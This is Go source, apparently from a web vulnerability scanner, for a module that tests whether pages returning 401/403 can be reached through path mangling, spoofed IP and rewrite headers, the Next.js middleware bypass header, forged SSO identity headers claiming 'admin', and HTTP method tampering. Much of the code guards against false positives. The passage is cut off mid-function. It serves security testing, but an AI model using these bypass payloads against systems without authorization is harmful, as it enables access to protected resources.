package forbidden_bypass

import (
	"fmt"
	"strings"

	"github.com/pkg/errors"
	stringsutil "github.com/projectdiscovery/utils/strings"
	urlutil "github.com/projectdiscovery/utils/url"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/types/severity"
)

type Module struct {
	modkit.BaseActiveModule
	ds                dedup.Lazy[dedup.DiskSet]
	limitCheckPerHost int
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest,
			modkit.AllInsertionPointTypes,
		),
		ds:                dedup.LazyDiskSet("forbidden_bypass"),
		limitCheckPerHost: 20,
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return results, nil
	}

	statusCode := 0
	if ctx.Response() != nil {
		statusCode = ctx.Response().StatusCode()
	}
	if statusCode != 401 && statusCode != 403 {
		return results, nil
	}
	// A 401/403 that is actually a WAF/CDN edge block (a CloudFront "Request
	// blocked" page, a Cloudflare/Akamai/Incapsula challenge, or a 429) is not an
	// application access-control decision. A probe variant that dodges the WAF
	// rule (an uppercased path, a "/%2e" prefix, a trusted-identity header) then
	// reaches the origin and reads as a 200 "bypass" even though the block was
	// edge mitigation, not the app protecting the resource. The guards below only
	// re-confirm the BARE path stays non-2xx, which a WAF that deterministically
	// re-blocks it satisfies — so they cannot tell an edge block from an app gate.
	// Discard such a baseline. IsEdgeBlockedResponse flags only vendor-identified
	// edge blocks, so a genuine nginx/apache/IIS app 403 (the real signal) is kept.
	if modkit.IsEdgeBlockedResponse(ctx.Response()) {
		return results, nil
	}
	if !m.markAndShouldContinue(urlx, scanCtx) {
		return results, nil
	}

	pathBypassResults, err := bypassPath(urlx, ctx, httpClient, scanCtx)
	if err == nil && len(pathBypassResults) > 0 {
		results = append(results, pathBypassResults...)
		return results, nil
	}

	// Trusted identity-header spoofing is a distinct, higher-severity class than the
	// generic IP/rewrite header tricks below, so it runs first: a confirmed identity
	// bypass should be the reported finding rather than being masked by a lower-value
	// IP-spoof hit on the same forbidden resource.
	trustedHeaderResults, err := bypassTrustedIdentityHeaders(urlx, ctx, httpClient, scanCtx)
	if err == nil && len(trustedHeaderResults) > 0 {
		results = append(results, trustedHeaderResults...)
		return results, nil
	}

	headerBypassResults, err := bypassHeaders(urlx, ctx, httpClient, scanCtx)
	if err == nil && len(headerBypassResults) > 0 {
		results = append(results, headerBypassResults...)
		return results, nil
	}

	methodBypassResults, err := bypassMethod(urlx, ctx, httpClient, scanCtx)
	if err == nil && len(methodBypassResults) > 0 {
		results = append(results, methodBypassResults...)
		return results, nil
	}

	return results, nil
}

func bypassPath(urlx *urlutil.URL, ctx *httpmsg.HttpRequestResponse, httpClient *http.Requester, scanCtx *modkit.ScanContext) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent
	path := urlx.EscapedPath()
	// NOTE: payloads MUST NOT contain a literal space or tab. A literal whitespace
	// is the HTTP request-line field delimiter, so both our own request builder
	// (httpmsg.GetPath parses the target only up to the first interior space) and
	// the origin parse e.g. "GET / /admin/ / HTTP/1.1" as a request for "/" — the
	// payload silently collapses to the site root and its homepage 200 gets
	// misreported as a 403 bypass (the login-uat.example.com false positive).
	// The whitespace-suffix trick can only be tested by emitting the raw bytes on
	// the wire (RawRequestTarget); over the normal client use the URL-ENCODED forms
	// below ("...%20" and "...%09"), which survive intact and actually append to
	// the path. The collapse guard in the loop enforces this invariant.
	pathPayloads := []string{
		"/." + path,
		path + "/./",
		"/." + path + "/./",
		path + "..;/",
		path + "?",
		path + "??",
		"/" + path + "//",
		path + "/",
		path + "/.testus",
		path + "../app.py",
		// Path normalization bypasses
		"//" + path,
		"/%2e" + path,
		path + "%00",
		path + ";",
		"/%2f" + path,
		path + "/%2e%2e/",
		"/." + path + "%20",
		strings.ToUpper(path),
		`\` + path,
		path + `%09`,
	}

	for _, payload := range pathPayloads {
		modifiedRaw, err := httpmsg.SetPath(ctx.Request().Raw(), payload)
		if err != nil {
			continue
		}

		// Collapse guard: a payload with a literal space/tab breaks the request
		// line so the effective wire path no longer matches what we intended —
		// typically collapsing to "/" and fetching the site root. Such a probe
		// cannot prove a bypass of the forbidden resource, so skip it. (Defensive:
		// the payload list above is already whitespace-free; this also covers any
		// future mutation that reintroduces one.)
		if effPath, perr := httpmsg.GetPath(modifiedRaw); perr == nil && effPath != payload {
			continue
		}

		// modifiedRaw is well-formed raw, so wrap directly instead of re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(modifiedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}
		if resp.Response().StatusCode == 200 {
			// A 200 alone is not a bypass: a server that answers every path with a
			// 200 catch-all/SPA shell would make every mutated payload "succeed". Only
			// report when the 200 body is distinguishable from the host's wildcard
			// response to a random path (fails open on probe error).
			body := resp.Body().String()
			location := resp.Response().Header.Get("Location")
			if !modkit.ConfirmNotSoft404(scanCtx, httpClient, ctx, 200, []byte(body), location) {
				resp.Close()
				continue
			}
			// Reproducibility gate: a transient 200 is not a bypass.
			if !confirmStableBypass(httpClient, ctx.Service(), modifiedRaw, 200, body) {
				resp.Close()
				continue
			}
			// Empty/blank-body catch-all guard: if a clean, unprivileged request to
			// an unrelated random path answers with the same shell (e.g. an empty
			// 200), the host catch-alls every URL and no path payload here is a real
			// bypass. ConfirmNotSoft404's WildcardProbe misses this because it only
			// fires on a NON-EMPTY wildcard body.
			if !confirmDistinctFromCatchAll(httpClient, ctx.Service(), ctx.Request().Raw(), 200, body) {
				resp.Close()
				return results, nil
			}
			// Path-shape catch-all guard: confirmDistinctFromCatchAll probes a CLEAN
			// random path and so misses a host that soft-serves one 200 only for the
			// MANGLED path shape while 404-ing clean unknown paths. Re-apply this
			// payload to a random base (see confirmDistinctFromShapeCatchAll); a
			// matching 200 is generic to the shape, so try the next payload.
			if !confirmDistinctFromShapeCatchAll(httpClient, ctx.Service(), ctx.Request().Raw(), payload, path, 200, body) {
				resp.Close()
				continue
			}
			// Clean-canonical control: re-verify the ORIGINAL clean path is STILL
			// access-controlled. The 401/403 baseline was captured at crawl time;
			// if it was transient (rate-limit / WAF / deploy) and the bare path is
			// now publicly 2xx, a 200 on a path-mutated payload is not a bypass —
			// the resource simply became reachable. No path payload can be a bypass
			// of a now-public resource, so drop the whole phase.
			if !stillForbiddenWithoutHeaders(httpClient, ctx.Service(), ctx.Request().Raw()) {
				resp.Close()
				return results, nil
			}
			respDump := resp.FullResponseString()
			results = append(results, &output.ResultEvent{
				URL:              urlx.Scheme + "://" + urlx.Host + payload,
				Request:          string(modifiedRaw),
				Response:         respDump,
				FuzzingParameter: "path",
				ExtractedResults: []string{payload},
				Info: output.Info{
					Description: "Found 403 Forbidden Bypass using path",
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	return results, nil
}

func bypassHeaders(
	urlx *urlutil.URL,
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	path := urlx.EscapedPath()
	headerPayloads := map[string]string{
		"x-rewrite-url":             path,
		"x-original-url":            path,
		"referer":                   path,
		"x-custom-ip-authorization": "127.0.0.1",
		"x-originating-ip":          "127.0.0.1",
		"x-forwarded-for":           "127.0.0.1",
		"x-remote-ip":               "127.0.0.1",
		"x-client-ip":               "127.0.0.1",
		"x-host":                    "127.0.0.1",
		"x-forwarded-host":          "127.0.0.1",
		// Next.js middleware bypass (CVE-2025-29927)
		"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware",
		"x-real-ip":               "127.0.0.1",
		"cf-connecting-ip":        "127.0.0.1",
	}

	for headerKey, headerValue := range headerPayloads {
		var newPath string
		if stringsutil.ContainsAny(headerKey, "x-rewrite-url", "referer") {
			newPath = "/anything"
		} else if strings.Contains(headerKey, "x-original-url") {
			newPath = "/"
		} else {
			newPath = path
		}

		// First set the path, then add the header
		modifiedRaw, err := httpmsg.SetPath(ctx.Request().Raw(), newPath)
		if err != nil {
			continue
		}
		modifiedRaw, err = httpmsg.AddHeader(modifiedRaw, headerKey, headerValue)
		if err != nil {
			continue
		}

		// modifiedRaw is well-formed raw, so wrap directly instead of re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(modifiedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}
		if resp.Response().StatusCode == 200 {
			// Same wildcard/catch-all guard as the path bypass: a 200 that merely
			// matches the host's random-path shell is not a genuine bypass.
			body := resp.Body().String()
			location := resp.Response().Header.Get("Location")
			if !modkit.ConfirmNotSoft404(scanCtx, httpClient, ctx, 200, []byte(body), location) {
				resp.Close()
				continue
			}
			// Reproducibility gate: a transient 200 is not a bypass.
			if !confirmStableBypass(httpClient, ctx.Service(), modifiedRaw, 200, body) {
				resp.Close()
				continue
			}
			// Empty/blank-body catch-all guard (see bypassPath). Probe a CLEAN
			// original request (no bypass header) at a random path: if it returns the
			// same shell, the special header isn't granting access — the host just
			// answers everything alike. Using the clean original (not modifiedRaw)
			// avoids a false negative on path-rewriting headers (x-original-url etc.),
			// whose server-honored path would otherwise echo the protected resource.
			if !confirmDistinctFromCatchAll(httpClient, ctx.Service(), ctx.Request().Raw(), 200, body) {
				resp.Close()
				return results, nil
			}
			// Causality gate: the injected header must be what produced the 200.
			// Several payloads here REWRITE the path to a different, often-public
			// resource (x-original-url → "/", x-rewrite-url/referer → "/anything"),
			// so a 200 can just be that resource answering on its own — the header
			// had no effect. Re-issue the same request at newPath WITHOUT the header;
			// if it returns the same response, the header is irrelevant, so drop this
			// probe and try the next one.
			if !confirmHeaderCausedChange(httpClient, ctx.Service(), ctx.Request().Raw(), newPath, 200, body) {
				resp.Close()
				continue
			}
			respDump := resp.FullResponseString()
			results = append(results, &output.ResultEvent{
				URL:              urlx.Scheme + "://" + urlx.Host + newPath,
				Request:          string(modifiedRaw),
				Response:         respDump,
				FuzzingParameter: headerKey,
				ExtractedResults: []string{headerValue},
				Info: output.Info{
					Description: "Found 403 Forbidden Bypass using header",
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	return results, nil
}

// trustedIdentityHeaders are request headers that upstream reverse proxies / SSO
// gateways (oauth2-proxy, nginx auth_request, Kong, ...) inject AFTER
// authenticating a user. A backend reached directly (proxy bypassed) may wrongly
// trust a client-supplied value, so asserting a privileged identity in one of
// these can turn a 401/403 into an authorized 200. Names are the canonical
// lowercase form.
var trustedIdentityHeaders = []string{
	"x-forwarded-user", "x-forwarded-email", "x-forwarded-role", "x-forwarded-groups",
	"x-forwarded-login", "x-forwarded-remote-user", "x-forwarded-preferred-username",
	"x-webauth-user", "x-remote-user", "x-auth-request-user", "x-auth-request-email",
	"x-auth-request-groups", "x-authenticated-user", "x-user",
	"x-user-id", "x-user-email", "x-user-role",
	"x-forwarded-preferred-user",
	"x-sso-user", "remote-user", "x-consumer-username",
}

// trustedHeaderProbeValue is the privileged principal asserted in each trusted
// identity header. A backend that trusts the header treats the request as this
// user, flipping a forbidden baseline into an authorized response.
const trustedHeaderProbeValue = "admin"

// bypassTrustedIdentityHeaders tests whether the backend trusts a client-supplied
// reverse-proxy/SSO identity header to make an authorization decision. It first
// probes each header on its own (precise attribution — exactly which header is
// trusted), then, only if none confirmed alone, sends ONE combined probe that
// asserts the identity across every header at once: some gateways (e.g.
// oauth2-proxy) gate on several headers together (user + email + groups), which a
// single-header probe would miss. Every candidate 200 must clear the multi-layer
// confirmation in confirmTrustedHeaderBypass before it is reported. Only the first
// confirmed bypass is returned, consistent with the module's other phases.
func bypassTrustedIdentityHeaders(
	urlx *urlutil.URL,
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	baseRaw := ctx.Request().Raw()
	baselineBody := string(ctx.Response().Body())

	// Phase 1 — one header at a time (precise attribution).
	for _, header := range trustedIdentityHeaders {
		modifiedRaw, err := httpmsg.AddOrReplaceHeader(baseRaw, header, trustedHeaderProbeValue)
		if err != nil {
			continue
		}
		ev, abort := evalTrustedHeaderProbe(
			urlx, ctx, httpClient, scanCtx, baseRaw, modifiedRaw, baselineBody,
			header,
			fmt.Sprintf("%s: %s", header, trustedHeaderProbeValue),
			fmt.Sprintf("Found 401/403 authentication bypass via the trusted identity header %q set to %q. "+
				"The backend trusts a client-supplied identity header that is normally injected by an upstream "+
				"reverse proxy / SSO gateway (oauth2-proxy, nginx auth_request, Kong); reached directly the header "+
				"can be spoofed to assert a privileged identity and gain access to a forbidden resource.",
				header, trustedHeaderProbeValue),
		)
		if abort {
			return results, nil
		}
		if ev != nil {
			results = append(results, ev)
			return results, nil
		}
	}

	// Phase 2 — all trusted identity headers at once (gateways that require several
	// together). Built once from the clean baseline; `combined` guards against
	// emitting a pointless bare-request probe if no header could be applied.
	combinedRaw := baseRaw
	combined := false
	for _, header := range trustedIdentityHeaders {
		next, err := httpmsg.AddOrReplaceHeader(combinedRaw, header, trustedHeaderProbeValue)
		if err != nil {
			continue
		}
		combinedRaw = next
		combined = true
	}
	if combined {
		headerList := strings.Join(trustedIdentityHeaders, ", ")
		ev, _ := evalTrustedHeaderProbe(
			urlx, ctx, httpClient, scanCtx, baseRaw, combinedRaw, baselineBody,
			"trusted-identity-headers",
			fmt.Sprintf("combined (%s) = %s", headerList, trustedHeaderProbeValue),
			fmt.Sprintf("Found 401/403 authentication bypass via a combined set of trusted identity headers "+
				"(%s) each set to %q. The backend trusts client-supplied reverse-proxy/SSO identity headers; some "+
				"gateways (e.g. oauth2-proxy) require several together (user + email + groups), which this combined "+
				"probe asserts at once.", headerList, trustedHeaderProbeValue),
		)
		if ev != nil {
			results = append(results, ev)
		}
	}

	return results, nil
}

// evalTrustedHeaderProbe issues one trusted-identity-header probe (modifiedRaw)
// and returns a finding only if the response is a 200 that clears the full
// multi-layer confirmation against the baseline. abort is true when the host is
// unresponsive, so the caller stops probing it.
func evalTrustedHeaderProbe(
	urlx *urlutil.URL,
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
	baseRaw, modifiedRaw []byte,
	baselineBody string,
	fuzzParam, evidence, description string,
) (ev *output.ResultEvent, abort bool) {
	// modifiedRaw is well-formed raw, so wrap directly instead of re-parsing on this hot path.
	fuzzedReq := httpmsg.NewRequestResponseRaw(modifiedRaw, ctx.Service())

	resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
	if err != nil {
		if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
			return nil, true
		}
		return nil, false
	}
	if resp.Response().StatusCode != 200 {
		resp.Close()
		return nil, false
	}
	bypassBody := resp.Body().String()
	location := resp.Response().Header.Get("Location")
	respDump := resp.FullResponseString()
	resp.Close()

	if !confirmTrustedHeaderBypass(ctx, httpClient, scanCtx, baseRaw, modifiedRaw, baselineBody, bypassBody, location) {
		return nil, false
	}

	return &output.ResultEvent{
		URL:              urlx.String(),
		Request:          string(modifiedRaw),
		Response:         respDump,
		FuzzingParameter: fuzzParam,
		ExtractedResults: []string{evidence},
		Info: output.Info{
			Name:        "Trusted Identity Header Authentication Bypass",
			Description: description,
			Severity:    severity.High,
			Confidence:  severity.Firm,
			Tags:        ModuleTags,
			Reference: []string{
				"https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/403-and-401-bypasses.html",
				"https://oauth2-proxy.github.io/oauth2-proxy/configuration/overview/",
			},
		},
	}, false
}

// confirmTrustedHeaderBypass is the multi-layer confirmation for a candidate
// trusted-identity-header bypass: a forbidden (401/403) baseline that returned 200
// once an identity header was injected. EVERY layer must hold, and the layers
// compare the candidate to the baseline on more than one axis so that neither a
// lone status flip NOR a lone body change is sufficient on its own:
//
//  1. not a soft-404 / SPA wildcard shell, and not a redirect to a login page;
//  2. the 200 body is meaningfully DIFFERENT from the forbidden baseline body — a
//     200 that still renders the original "forbidden" page is not real access;
//  3. the bypass REPRODUCES on a re-fetch (same 200 + textually stable body), so a
//     one-shot flap / cache edge does not qualify;
//  4. the response is DISTINCT from the host's catch-all (a random path under the
//     same clean template answers differently), ruling out a wildcard 200 handler;
//  5. CAUSALITY: re-issuing the BARE request (identity header removed) is STILL
//     access-controlled — proving the header, not a deploy that made the resource
//     public, is what flipped the result.
//
// Layers 3-5 fail OPEN on a transient/inconclusive error so a flaky confirm fetch
// never suppresses a real bypass.
func confirmTrustedHeaderBypass(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
	baseRaw, modifiedRaw []byte,
	baselineBody, bypassBody, location string,
) bool {
	// 1. soft-404 / SPA shell / login-redirect guard.
	if !modkit.ConfirmNotSoft404(scanCtx, httpClient, ctx, 200, []byte(bypassBody), location) {
		return false
	}
	// 2. the authorized body must diverge from the forbidden baseline body.
	if modkit.BodiesSimilar(baselineBody, bypassBody) {
		return false
	}
	// 3. reproducible 200 + stable body.
	if !confirmStableBypass(httpClient, ctx.Service(), modifiedRaw, 200, bypassBody) {
		return false
	}
	// 4. distinct from the host's catch-all / wildcard handler.
	if !confirmDistinctFromCatchAll(httpClient, ctx.Service(), baseRaw, 200, bypassBody) {
		return false
	}
	// 5. causal: the bare request (no identity header) is still forbidden.
	if !stillForbiddenWithoutHeaders(httpClient, ctx.Service(), baseRaw) {
		return false
	}
	return true
}

// stillForbiddenWithoutHeaders re-issues the bare request (no injected identity
// header) and reports whether the resource remains access-controlled, so a 200
// seen only WITH the header is attributable to the header rather than to the
// resource having become public. It returns false (drop) ONLY when the bare
// request is itself authorized now (a 2xx). It fails OPEN (true) on a transient
// error or any non-2xx status, so a real bypass is never suppressed.
func stillForbiddenWithoutHeaders(httpClient *http.Requester, service *httpmsg.Service, baseRaw []byte) bool {
	status, _, ok := modkit.ExecuteRaw(httpClient, service, baseRaw, http.Options{NoRedirects: true, NoClustering: true})
	if !ok {
		return true // inconclusive transient error — don't suppress
	}
	if status >= 200 && status < 300 {
		return false // resource is public independent of the header → drop
	}
	return true
}

// bypassMethods are HTTP methods to test for method tampering bypass.
var bypassMethods = []string{"PUT", "PATCH", "DELETE", "TRACE", "PROPFIND", "CONNECT"}

// methodOverrideHeaders are headers that can override the HTTP method at the server level.
var methodOverrideHeaders = []string{
	"X-HTTP-Method-Override",
	"X-HTTP-Method",
	"X-Method-Override",
}

func bypassMethod(
	urlx *urlutil.URL,
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	// Phase 1: Try different HTTP methods directly
	for _, method := range bypassMethods {
		modifiedRaw, err := httpmsg.SetMethod(ctx.Request().Raw(), method)
		if err != nil {
			continue
		}

		// modifiedRaw is well-formed raw, so wrap directly instead of re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(modifiedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}

		if resp.Response() != nil && isMethodBypassStatus(method, resp.Response().StatusCode, resp.FullResponseString()) {
			// A catch-all host that 2xx-es every request would make every method a
			// "bypass"; require the response to be distinguishable from the host's
			// wildcard shell.
			body := resp.Body().String()
			location := resp.Response().Header.Get("Location")
			if !modkit.ConfirmNotSoft404(scanCtx, httpClient, ctx, resp.Response().StatusCode, []byte(body), location) {
				resp.Close()
				continue
			}
			// Reproducibility gate: a transient 2xx for the method is not a bypass.
			if !confirmStableBypass(httpClient, ctx.Service(), modifiedRaw, resp.Response().StatusCode, body) {
				resp.Close()
				continue
			}
			// Empty/blank-body catch-all guard (see bypassPath). Probe the SAME
			// method at a random path (modifiedRaw already carries the mutated method
			// with the original, space-free path) so a per-method catch-all is caught:
			// if METHOD /random returns the same shell as METHOD /resource, the method
			// isn't bypassing anything.
			if !confirmDistinctFromCatchAll(httpClient, ctx.Service(), modifiedRaw, resp.Response().StatusCode, body) {
				resp.Close()
				return results, nil
			}
			// Clean-canonical control: re-verify the ORIGINAL method+path is STILL
			// access-controlled. If the crawl-time 401/403 was transient and the
			// bare request is now 2xx (resource became public), a 2xx for an
			// alternate method is not a bypass — drop the phase.
			if !stillForbiddenWithoutHeaders(httpClient, ctx.Service(), ctx.Request().Raw()) {
				resp.Close()
				return results, nil
			}
			respDump := resp.FullResponseString()
			results = append(results, &output.ResultEvent{
				URL:              urlx.String(),
				Request:          string(modifiedRaw),
				Response:         respDump,
				FuzzingParameter: "method",
				ExtractedResults: []string{method},
				Info: output.Info{
					Description: "Found 403/401 Bypass using HTTP method " + method,
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	// Phase 2: Try method override headers with POST
	for _, overrideHeader := range methodOverrideHeaders {
		modifiedRaw, err := httpmsg.SetMethod(ctx.Request().Raw(), "POST")
		if err != nil {
			continue
		}
		modifiedRaw, err = httpmsg.AddOrReplaceHeader(modifiedRaw, overrideHeader, "GET")
		if err != nil {
			continue
		}

		// modifiedRaw is well-formed raw, so wrap directly instead of re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(modifiedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}

		if resp.Response() != nil && resp.Response().StatusCode == 200 {
			body := resp.FullResponseString()
			respBody := resp.Body().String()
			location := resp.Response().Header.Get("Location")
			if !strings.Contains(strings.ToLower(body), "method not allowed") &&
				modkit.ConfirmNotSoft404(scanCtx, httpClient, ctx, 200, []byte(respBody), location) &&
				confirmStableBypass(httpClient, ctx.Service(), modifiedRaw, 200, respBody) &&
				// Empty/blank-body catch-all guard (see bypassPath): the override
				// must yield content distinct from the host's response to an
				// unrelated random path, or it's just the catch-all shell.
				confirmDistinctFromCatchAll(httpClient, ctx.Service(), modifiedRaw, 200, respBody) &&
				// Clean-canonical control: the original method+path must still be
				// access-controlled — a now-public resource is not a method-override
				// bypass.
				stillForbiddenWithoutHeaders(httpClient, ctx.Service(), ctx.Request().Raw()) {
				results = append(results, &output.ResultEvent{
					URL:              urlx.String(),
					Request:          string(modifiedRaw),
					Response:         body,
					FuzzingParameter: overrideHeader,
					ExtractedResults: []string{"POST with " + overrideHeader + ": GET"},
					Info: output.Info{
						Description: "Found 403/401 Bypass using method override header " + overrideHeader,
					},
				})
				resp.Close()
				return results, nil
			}
		}
		resp.Close()
	}

	return results, nil
}

// isMethodBypassStatus checks whether the response indicates a genuine method bypass.
// Filters out common false positives.
func isMethodBypassStatus(method string, statusCode int, body string) bool {
	// 405, 401, 403, 404 are not bypasses
	switch statusCode {
	case 405, 401, 403, 404:
		return false
	}

	// Only consider 2xx as potential bypasses
	if statusCode < 200 || statusCode >= 300 {
		return false
	}

	bodyLower := strings.ToLower(body)

	// HEAD returning 200 is normal behavior, not a bypass
	if method == "HEAD" {
		return false
	}

	// OPTIONS with small body is likely CORS preflight, not a bypass
	if method == "OPTIONS" && len(body) < 500 {
		return false
	}

	// Redirect to login page is not a bypass
	if strings.Contains(bodyLower, "/login") || strings.Contains(bodyLower, "/signin") {
		return false
	}

	// "Method not allowed" in body is not a bypass
	if strings.Contains(bodyLower, "method not allowed") {
		return false
	}

	return true
}

// confirmStableBypass re-issues the same mutated request once more and reports
// whether the bypass reproduces: the re-fetch must return the SAME status and a
// body that is textually stable (QuickRatio >= UpperRatioBound) versus the first
// hit. A one-shot 200 from a load-balancer flap, a race, or a caching edge will
// not reproduce and is dropped. It fails OPEN (returns true) only on an
// inconclusive transient error (parse/network failure on the confirm fetch) so a
// real bypass is never suppressed by a flaky second request.
func confirmStableBypass(
	httpClient *http.Requester,
	service *httpmsg.Service,
	modifiedRaw []byte,
	wantStatus int,
	firstBody string,
) bool {
	status, body, ok := modkit.ExecuteRaw(httpClient, service, modifiedRaw, http.Options{NoRedirects: true, NoClustering: true})
	if !ok {
		return true // inconclusive transient error — don't suppress
	}
	if status != wantStatus {
		return false // bypass did not reproduce → drop
	}
	return modkit.BodiesSimilar(firstBody, body)
}

// confirmDistinctFromCatchAll reports whether a candidate bypass response is
// genuinely tied to the targeted resource rather than the host answering every
// URL alike. It re-issues baseRaw — the bypass request's clean template (same
// method, minus any path-rewriting bypass header) — against a fresh random,
// definitely-nonexistent path: if that unprivileged control returns the SAME
// status AND a body indistinguishable from the bypass response, the host is a
// catch-all / wildcard handler (e.g. a Google-fronted edge that returns an empty
// 200 for every path) and the "bypass" is meaningless, so it returns false (drop).
//
// It complements modkit.ConfirmNotSoft404, whose WildcardProbe only fires on a
// NON-EMPTY wildcard body (WildcardEntry.IsWildcard requires BodyLen > 0 and
// MatchesBody bails on an empty body), so an empty-body catch-all slips straight
// through it — the exact shape behind the bsr.netflix.net forbidden-bypass false
// positives, where every mutated payload AND a clean random path return a blank
// 200. Here modkit.BodiesSimilar treats two empty bodies as identical, closing
// that gap.
//
// It fails OPEN (returns true) on a parse/transport error so a transient failure
// never suppresses a real bypass.
func confirmDistinctFromCatchAll(
	httpClient *http.Requester,
	service *httpmsg.Service,
	baseRaw []byte,
	bypassStatus int,
	bypassBody string,
) bool {
	controlRaw, err := httpmsg.SetPath(baseRaw, "/"+modkit.FreshCanary()+"-vgo404")
	if err != nil {
		return true // inconclusive — don't suppress
	}
	status, body, ok := modkit.ExecuteRaw(httpClient, service, controlRaw, http.Options{NoRedirects: true, NoClustering: true})
	if !ok {
		return true // inconclusive transient error — don't suppress
	}
	if status != bypassStatus {
		return true // an unrelated path answers differently → response is resource-specific, keep
	}
	if modkit.BodiesSimilar(bypassBody, body) {
		return false // same shell for an unprivileged random path → catch-all, drop
	}
	return true
}

// confirmDistinctFromShapeCatchAll reports whether a candidate path-bypass 200 is
// tied to the targeted resource rather than a generic body the host serves for the
// PAYLOAD'S PATH SHAPE regardless of which resource it decorates.
// confirmDistinctFromCatchAll probes a CLEAN random path, so it misses a reverse
// proxy / CDN / SPA that soft-serves a 200 ONLY for mangled paths (`/admin..;/`,
// `/./admin`, `//admin`) while answering a clean unknown path with a normal 404 —
// the acme/Salesforce false-positive shape, where `/<anything>..;/` returns one
// base-independent error page. It re-applies the SAME payload transformation to a
// same-depth random base (substituting the protected path inside the payload) and,
// if that unprivileged same-shape control returns the SAME status AND an
// indistinguishable body, the 200 is generic to the shape (not a bypass of the
// resource) and it returns false (drop this payload). Fails OPEN (true) when a
// same-shape control cannot be derived — the payload does not embed the path
// verbatim (e.g. an upper-cased path) or the path is the bare root — or on any
// transport error, so a real bypass is never suppressed.
func confirmDistinctFromShapeCatchAll(
	httpClient *http.Requester,
	service *httpmsg.Service,
	baseRaw []byte,
	payload, origPath string,
	bypassStatus int,
	bypassBody string,
) bool {
	if strings.Trim(origPath, "/") == "" || !strings.Contains(payload, origPath) {
		return true // no embedded path to randomize (root path / upper-cased) — don't suppress
	}
	shapePayload := strings.Replace(payload, origPath, modkit.RandomSameDepthPath(origPath), 1)
	controlRaw, err := httpmsg.SetPath(baseRaw, shapePayload)
	if err != nil {
		return true // inconclusive — don't suppress
	}
	status, body, ok := modkit.ExecuteRaw(httpClient, service, controlRaw, http.Options{NoRedirects: true, NoClustering: true})
	if !ok {
		return true // inconclusive transient error — don't suppress
	}
	if status != bypassStatus {
		return true // the same shape on a random base answers differently → resource-specific, keep
	}
	if modkit.BodiesSimilar(bypassBody, body) {
		return false // same body for the shape on an unrelated base → shape catch-all, drop
	}
	return true
}

// confirmHeaderCausedChange reports whether the injected bypass header is what
// produced the candidate 200, by re-issuing the SAME request at the same newPath
// WITHOUT that header (origRaw is the unmodified original request; setting its path
// to newPath yields the bypass request's template minus the injected header). If
// that clean control returns the same status AND a body indistinguishable from the
// bypass response, the header had no causal effect — the resource at newPath is
// simply reachable on its own (e.g. an x-original-url probe whose newPath is "/"
// returns the public homepage regardless of the header) — so it returns false
// (drop). A different status or a materially different body means the header
// changed the outcome, so it returns true (keep). Fails OPEN (true) on a
// parse/transport error so a transient failure never suppresses a real bypass.
func confirmHeaderCausedChange(
	httpClient *http.Requester,
	service *httpmsg.Service,
	origRaw []byte,
	newPath string,
	bypassStatus int,
	bypassBody string,
) bool {
	cleanRaw, err := httpmsg.SetPath(origRaw, newPath)
	if err != nil {
		return true // inconclusive — don't suppress
	}
	status, body, ok := modkit.ExecuteRaw(httpClient, service, cleanRaw, http.Options{NoRedirects: true, NoClustering: true})
	if !ok {
		return true // inconclusive transient error — don't suppress
	}
	if status != bypassStatus {
